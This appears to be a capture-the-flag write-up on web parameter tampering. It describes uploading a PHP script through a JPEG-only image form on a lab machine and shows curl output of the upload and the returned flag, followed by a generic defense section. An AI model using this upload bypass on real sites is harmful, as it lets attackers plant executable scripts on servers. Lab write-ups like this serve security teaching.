# Image_upload_temper_data

## Description

https://owasp.org/www-community/attacks/Web_Parameter_Tampering

The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control.

Its exploitation can result in other consequences including XSS, SQL Injection, file inclusion, and path disclosure attacks.

Here we find a parameter tempering vulnerability,
If we click on add image we end up on a page with an image upload form
This form should accept only jpeg files
But with a tempering data attack we manage to upload a php script


## Attack

	$ sh attack.sh
	Note: Unnecessary use of -X or --request, POST is already inferred.
	% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
									Dload  Upload   Total   Spent    Left  Speed
	0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.101:80...
	* Connected to 192.168.56.101 (192.168.56.101) port 80 (#0)
	> POST /?page=upload HTTP/1.1
	> Host: 192.168.56.101
	> User-Agent: curl/7.79.1
	> Accept: */*
	> Content-Length: 340
	> Content-Type: multipart/form-data; boundary=------------------------25247114f522d754
	> 
	} [340 bytes data]
	* We are completely uploaded and fine
	100   340    0     0  100   340      0     80  0:00:04  0:00:04 --:--:--    80* Mark bundle as not supporting multiuse
	< HTTP/1.1 200 OK
	< Server: nginx/1.4.6 (Ubuntu)
	< Date: Thu, 28 Jul 2022 15:42:24 GMT
	< Content-Type: text/html
	< Transfer-Encoding: chunked
	< Connection: keep-alive
	< X-Powered-By: PHP/5.5.9-1ubuntu4.29
	< Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Thu, 28-Jul-2022 16:42:19 GMT; Max-Age=3600
	< 
	{ [2761 bytes data]
	100  3089    0  2749  100   340    547     67  0:00:05  0:00:05 --:--:--   572
	* Connection #0 to host 192.168.56.101 left intact
	<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/hack.php succesfully uploaded.</pre>

The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

## Defense

A primary defense against data tampering is to use a firewall and windows security to lock down important files, directories and other resources. The web application should also run with minimum privileges. Guarding against script exploits by not trusting any information that comes from a user or even from a database. Appropriate and safe steps should be taken when getting information from untrusted sources, to make sure it does not contain any malicious executable code.

Counter-Measures to prevent data tampering are done through the following ways: by using data signing and harsing, using digital signatures, using strong authorization, using tamper resistant protocols across communication links, using secure communication links with protocols that provide message integrity, also by using strong and powerful firewalls, and long passwords that consist of alphanumeric characters, by also blocking IP addresses for a certain period of time which will cause repeated failed login attempts by the attacker.

Also by using access controls to protect data in persistent stores to ensure that only authorized users can access and modify the data, and by using role based security to define which users can view data and which users can modify data.